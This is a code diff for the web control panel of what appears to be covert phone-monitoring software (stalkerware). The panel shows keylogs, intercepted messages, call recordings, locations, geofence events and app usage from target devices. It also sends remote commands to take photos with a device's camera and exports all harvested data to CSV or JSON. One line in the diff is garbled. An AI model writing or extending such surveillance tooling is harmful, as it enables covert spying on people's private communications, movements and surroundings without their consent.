+          res.data.forEach(alert => {
+            const row = `<tr>
+              <td>${alert.keyword || ''}</td>
+              <td>${alert.matchedText ? alert.matchedText.substring(0, 100) : ''}</td>
+              <td>${alert.app || ''}</td>
+              <td>${new Date(alert.timestamp).toLocaleString()}</td>
+            </tr>`;
+            tbody.insertAdjacentHTML('beforeend', row);
+          });
+        } else {
+          tbody.innerHTML = '<tr><td colspan="4">No keyword alerts found</td></tr>';
+        }
       }
     }
 
-    // ----- GEOFENCE -----
+    // Geofence
     async function loadGeofence() {
       const res = await fetchAPI('/data/geofence');
-      if (res.success) {
+      if (res && res.success) {
         const tbody = document.querySelector('#geofenceTable tbody');
         tbody.innerHTML = '';
-        res.data.forEach(ev => {
-          const row = `<tr><td>${ev.name}</td><td>${ev.triggerEvent}</td><td>${ev.centerLat}, ${ev.centerLng}</td><td>${ev.radius}m</td><td>${new Date(ev.timestamp).toLocaleString()}</td></tr>`;
-          tbody.insertAdjacentHTML('beforeend', row);
-        });
+        if (res.data && res.data.length) {
+          res.data.forEach(ev => {
+            const row = `<tr>
+              <td>${ev.name || ''}</td>
+              <td>${ev.triggerEvent || ''}</td>
+              <td>${ev.centerLat || ''}, ${ev.centerLng || ''}</td>
+              <td>${ev.radius || 0}m</td>
+              <td>${new Date(ev.timestamp).toLocaleString()}</td>
+            </tr>`;
+            tbody.insertAdjacentHTML('beforeend', row);
+          });
+        } else {
+          tbody.innerHTML = '<tr><td colspan="5">No geofence events found</td></tr>';
+        }
       }
     }
 
-    // ----- APP USAGE -----
+    // App Usage
     async function loadAppUsage() {
       const res = await fetchAPI('/data/app-usage');
-      if (res.success) {
+      if (res && res.success) {
         const tbody = document.querySelector('#appusageTable tbody');
         tbody.innerHTML = '';
-        res.data.forEach(usage => {
-          const row = `<tr><td>${usage.appName}</td><td>${usage.appPackage}</td><td>${usage.foregroundTime}</td><td>${new Date(usage.timestamp).toLocaleString()}</td></tr>`;
-          tbody.insertAdjacentHTML('beforeend', row);
-        });
+        if (res.data && res.data.length) {
+          res.data.forEach(usage => {
+            const row = `<tr>
+              <td>${usage.appName || ''}</td>
+              <td>${usage.appPackage || ''}</td>
+              <td>${usage.foregroundTime || 0}</td>
+              <td>${new Date(usage.timestamp).toLocaleString()}</td>
+            </tr>`;
+            tbody.insertAdjacentHTML('beforeend', row);
+          });
+        } else {
+          tbody.innerHTML = ' hilab<td colspan="4">No app usage data found</td></tr>';
+        }
       }
     }
 
-    // ----- CALL RECORDINGS -----
+    // Call Recordings
     async function loadRecordings() {
       const res = await fetchAPI('/data/call-recordings');
-      if (res.success && res.data.length) {
+      if (res && res.success && res.data && res.data.length) {
         const tbody = document.querySelector('#recordingsTable tbody');
         tbody.innerHTML = '';
         res.data.forEach(rec => {
@@ -692,26 +1002,32 @@
           if (rec.audioBase64) {
             audioHtml = `<audio controls src="data:audio/3gpp;base64,${rec.audioBase64}" style="width:150px;"></audio>`;
           } else if (rec.fileUrl) {
-            audioHtml = `<a href="${rec.fileUrl}" target="_blank">Play</a>`;
+            audioHtml = `<a href="${rec.fileUrl}" target="_blank" style="color:#0f0;">Play</a>`;
           } else {
             audioHtml = 'No audio';
           }
-          const row = `<tr><td>${rec.callId || 'N/A'}</td><td>${rec.duration || 0}s</td><td>${new Date(rec.timestamp).toLocaleString()}</td><td>${audioHtml}</td></tr>`;
+          const row = `<tr>
+            <td>${rec.callId || 'N/A'}</td>
+            <td>${rec.duration || 0}s</td>
+            <td>${new Date(rec.timestamp).toLocaleString()}</td>
+            <td>${audioHtml}</td>
+          </tr>`;
           tbody.insertAdjacentHTML('beforeend', row);
         });
       } else {
-        document.querySelector('#recordingsTable tbody').innerHTML = '<tr><td colspan="4">No recordings yet. Feature coming soon.</td></tr>';
+        const tbody = document.querySelector('#recordingsTable tbody');
+        if (tbody) tbody.innerHTML = '<tr><td colspan="4">No recordings yet. Feature coming soon.</td></tr>';
       }
     }
 
-    // ----- EXPORT -----
+    // Export Functions
     async function exportData() {
       playBeep();
       const endpoints = ['calls', 'messages', 'contacts', 'locations', 'browser', 'keylogs', 'keyword-alerts', 'geofence', 'app-usage'];
       let allData = [];
       for (let ep of endpoints) {
         const res = await fetchAPI(`/data/${ep}`);
-        if (res.success) allData.push({ type: ep, data: res.data });
+        if (res && res.success) allData.push({ type: ep, data: res.data || [] });
       }
       let csvRows = [];
       allData.forEach(section => {
@@ -720,7 +1036,11 @@
           const headers = Object.keys(section.data[0]);
           csvRows.push(headers.join(','));
           section.data.forEach(row => {
-            const values = headers.map(h => JSON.stringify(row[h] || ''));
+            const values = headers.map(h => {
+              let val = row[h] || '';
+              if (typeof val === 'string' && val.includes(',')) val = `"${val}"`;
+              return val;
+            });
             csvRows.push(values.join(','));
           });
         } else csvRows.push('No data');
@@ -729,79 +1049,141 @@
       const url = URL.createObjectURL(blob);
       const a = document.createElement('a');
       a.href = url;
-      a.download = 'monitoring_export.csv';
+      a.download = `monitoring_export_${new Date().toISOString().slice(0,19)}.csv`;
       a.click();
       URL.revokeObjectURL(url);
     }
 
-    // ----- LIVE CAMERA -----
+    async function exportAsJson() {
+      playBeep();
+      const endpoints = ['calls', 'messages', 'contacts', 'locations', 'browser', 'keylogs', 'keyword-alerts', 'geofence', 'app-usage'];
+      let allData = {};
+      for (let ep of endpoints) {
+        const res = await fetchAPI(`/data/${ep}`);
+        if (res && res.success) allData[ep] = res.data || [];
+      }
+      const blob = new Blob([JSON.stringify(allData, null, 2)], { type: 'application/json' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = `monitoring_export_${new Date().toISOString().slice(0,19)}.json`;
+      a.click();
+      URL.revokeObjectURL(url);
+    }
+
+    // Live Camera
     let photoPollingInterval = null;
+    let autoPhotoPolling = false;
 
     async function loadCameraDevices() {
       const res = await fetchAPI('/data/devices');
-      if (res.success) {
+      if (res && res.success) {
         const select = document.getElementById('cameraDeviceSelect');
-        select.innerHTML = '';
-        res.data.forEach(device => {
-          const option = document.createElement('option');
-          option.value = device.deviceId;
-          option.textContent = device.deviceName || device.deviceModel || 'Unknown';
-          select.appendChild(option);
-        });
+        if (select) {
+          select.innerHTML = '<option value="">Select a device</option>';
+          if (res.data && res.data.length) {
+            res.data.forEach(device => {
+              const option = document.createElement('option');
+              option.value = device.deviceId;
+              option.textContent = device.deviceName || device.deviceModel || device.deviceId;
+              select.appendChild(option);
+            });
+          }
+        }
       }
     }
 
     async function takePhoto() {
       const select = document.getElementById('cameraDeviceSelect');
-      const deviceId = select.value;
+      const deviceId = select ? select.value : '';
       if (!deviceId) {
-        alert('No device selected');
+        alert('Please select a device first');
         return;
       }
-      const res = await fetch(`${API_BASE}/client/command`, {
+      
+      document.getElementById('cameraMessage').innerText = 'Sending command to device...';
+      
+      const res = await fetchAPI('/client/command', {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Authorization': `Bearer ${token}`
-        },
         body: JSON.stringify({ deviceId, command: 'take_photo' })
       });
-      const data = await res.json();
-      if (data.success) {
+      
+      if (res && res.success) {
         document.getElementById('cameraMessage').innerText = 'Command sent. Waiting for photo...';
-        startPhotoPolling();
+        if (autoPhotoPolling) {
+          startPhotoPolling();
+        } else {
+          // Single poll
+          setTimeout(() => pollForPhoto(), 2000);
+        }
       } else {
-        alert('Failed to send command');
+        document.getElementById('cameraMessage').innerText = 'Failed to send command: ' + (res?.error || 'Unknown error');
+      }
+    }
+
+    async function pollForPhoto() {
+      const res = await fetchAPI('/data/photos');
+      if (res && res.success && res.data && res.data.length > 0) {
+        const latest = res.data[0];
+        const img = document.getElementById('latestPhoto');
+        img.src = latest.imageBase64.startsWith('data:') ? latest.imageBase64 : `data:image/jpeg;base64,${latest.imageBase64}`;
+        img.style.display = 'block';
+        document.getElementById('cameraMessage').innerHTML = `Latest photo from device:<br><small>${new Date(latest.timestamp).toLocaleString()}</small>`;
       }
     }
 
     function startPhotoPolling() {
       if (photoPollingInterval) clearInterval(photoPollingInterval);
       photoPollingInterval = setInterval(async () => {
-        const res = await fetchAPI('/data/photos');
-        if (res.success && res.data.length > 0) {
-          const latest = res.data[0];
-          const img = document.getElementById('latestPhoto');
-          img.src = `data:image/jpeg;base64,${latest.imageBase64}`;
-          img.style.display = 'block';
-          document.getElementById('cameraMessage').innerText = 'Latest photo from device:';
-          clearInterval(photoPollingInterval);
-          photoPollingInterval = null;
-        }
-      }, 2000);
-      setTimeout(() => {
-        if (photoPollingInterval) {
-          clearInterval(photoPollingInterval);
-          photoPollingInterval = null;
-          document.getElementById('cameraMessage').innerText = 'No photo received. Try again.';
-        }
-      }, 30000);
+        await pollForPhoto();
+      }, 3000);
     }
 
-    // ========== AUTO‑REFRESH LOGIC ==========
+    function stopPhotoPolling() {
+      if (photoPollingInterval) {
+        clearInterval(photoPollingInterval);
+        photoPollingInterval = null;
+      }
+    }
+
+    function togglePhotoPolling() {
+      autoPhotoPolling = !autoPhotoPolling;
+      const btn = document.getElementById('startPhotoPollingBtn');
+      if (autoPhotoPolling) {
+        startPhotoPolling();
+        if (btn) {
+          btn.innerHTML = '🔄 Auto Polling ON';
+          btn.style.background = '#0f0';
+          btn.style.color = 'black';
+        }
+      } else {
+        stopPhotoPolling();
+        if (btn) {
+          btn.innerHTML = '🔄 Auto Polling OFF';
+          btn.style.background = '';
+          btn.style.color = '';
+        }
+      }
+    }
+
+    // Modal close
+    const modal = document.getElementById('imageModal');
+    const closeModal = document.querySelector('.close-modal');
+    if (closeModal) {
+      closeModal.onclick = () => {
+        modal.style.display = 'none';
+      };
+    }
+    window.onclick = (event) => {
+      if (event.target === modal) {
+        modal.style.display = 'none';
+      }
+    };
+
+    // ========== AUTO-REFRESH LOGIC ==========
     let refreshInterval = null;
     let autoRefreshActive = true;
-    const AUTO_REFRESH_TIME = 10000; // 10 seconds
+    const AUTO_REFRESH_TIME = 10000;
 
     function refreshCurrentTab() {
       const activeTab = document.querySelector('.tab-content.active');
@@ -817,15 +1199,14 @@
         case 'social-instagram': loadMessagesIntoTable('social-instagram', 'instagram'); break;
         case 'social-facebook': loadMessagesIntoTable('social-facebook', 'facebook'); break;
         case 'contacts': loadContacts(); break;
-        case 'locations': loadLocations(); break;
+        case 'locations': if (!liveActive) loadLocations(); break;
         case 'browser': loadBrowser(); break;
         case 'screenshots': loadScreenshots(); break;
         case 'keylogs': loadKeylogs(); break;
         case 'keywords': loadKeywords(); break;
         case 'geofence': loadGeofence(); break;
         case 'appusage': loadAppUsage(); break;
-        case 'livecamera': loadCameraDevices(); break;
-        // export tab does not need refresh
+        case 'livecamera': if (autoPhotoPolling) pollForPhoto(); break;
       }
     }
 
@@ -844,33 +1225,35 @@
     }
 
     const toggleBtn = document.getElementById('autoRefreshToggleBtn');
-    toggleBtn.addEventListener('click', () => {
-      autoRefreshActive = !autoRefreshActive;
-      if (autoRefreshActive) {
-        toggleBtn.innerHTML = '⏱️ Auto-Refresh ON';
-        toggleBtn.style.background = '';
-        startAutoRefresh();
-      } else {
-        toggleBtn.innerHTML = '⏱️ Auto-Refresh OFF';
-        toggleBtn.style.background = 'rgba(255,0,0,0.2)';
-        stopAutoRefresh();
-      }
-    });
+    if (toggleBtn) {
+      toggleBtn.addEventListener('click', () => {
+        autoRefreshActive = !autoRefreshActive;
+        if (autoRefreshActive) {
+          toggleBtn.innerHTML = '⏱️ Auto-Refresh ON';
+          toggleBtn.style.background = '';
+          startAutoRefresh();
+        } else {
+          toggleBtn.innerHTML = '⏱️ Auto-Refresh OFF';
+          toggleBtn.style.background = 'rgba(255,0,0,0.2)';
+          stopAutoRefresh();
+        }
+      });
+    }
 
-    document.getElementById('refreshBtn').addEventListener('click', () => {
+    document.getElementById('refreshBtn')?.addEventListener('click', () => {
       playBeep();
       refreshCurrentTab();
     });
 
-    // Start auto‑refresh
     startAutoRefresh();
 
-    // Stop on page unload (optional)
     window.addEventListener('beforeunload', () => {
       stopAutoRefresh();
+      stopLiveTracking();
+      stopPhotoPolling();
     });
 
-    // ----- TAB SWITCHING -----
+    // ========== TAB SWITCHING ==========
     const tabs = document.querySelectorAll('.sidebar a');
     const contents = document.querySelectorAll('.tab-content');
     tabs.forEach(link => {
@@ -878,11 +1261,13 @@
         e.preventDefault();
         const tabId = link.getAttribute('data-tab');
         contents.forEach(content => content.classList.remove('active'));
-        document.getElementById(tabId).classList.add('active');
+        const activeContent = document.getElementById(tabId);
+        if (activeContent) activeContent.classList.add('active');
         tabs.forEach(t => t.classList.remove('active'));
         link.classList.add('active');
+        
         if (tabId !== 'locations' && liveActive) stopLiveTracking();
-        // Load data for the new tab
+        
         switch(tabId) {
           case 'dashboard': loadDashboard(); break;
           case 'devices': loadDevices(); break;
@@ -900,28 +1285,31 @@
           case 'keywords': loadKeywords(); break;
           case 'geofence': loadGeofence(); break;
           case 'appusage': loadAppUsage(); break;
-          case 'export': document.getElementById('exportBtn').onclick = exportData; break;
+          case 'export': 
+            document.getElementById('exportBtn').onclick = exportData;
+            document.getElementById('exportJsonBtn').onclick = exportAsJson;
+            break;
           case 'livecamera': loadCameraDevices(); break;
         }
       });
     });
 
     // Attach location controls
-    document.getElementById('centerLatestBtn').addEventListener('click', () => {
+    document.getElementById('centerLatestBtn')?.addEventListener('click', () => {
       if (map) centerOnLatest();
     });
-    document.getElementById('liveTrackingBtn').addEventListener('click', toggleLiveTracking);
+    document.getElementById('liveTrackingBtn')?.addEventListener('click', toggleLiveTracking);
+    document.getElementById('takePhotoBtn')?.addEventListener('click', takePhoto);
+    document.getElementById('startPhotoPollingBtn')?.addEventListener('click', togglePhotoPolling);
 
-    // Take photo button
-    document.getElementById('takePhotoBtn').addEventListener('click', takePhoto);
-
-    // Logout with sound
-    document.getElementById('logoutBtn').addEventListener('click', () => {
+    // Logout
+    document.getElementById('logoutBtn')?.addEventListener('click', () => {
       playBeep();
       localStorage.removeItem('token');
       window.location.href = 'login.html';
     });
 
+    // Initial load
     loadUser();
     loadDashboard();
   </script>
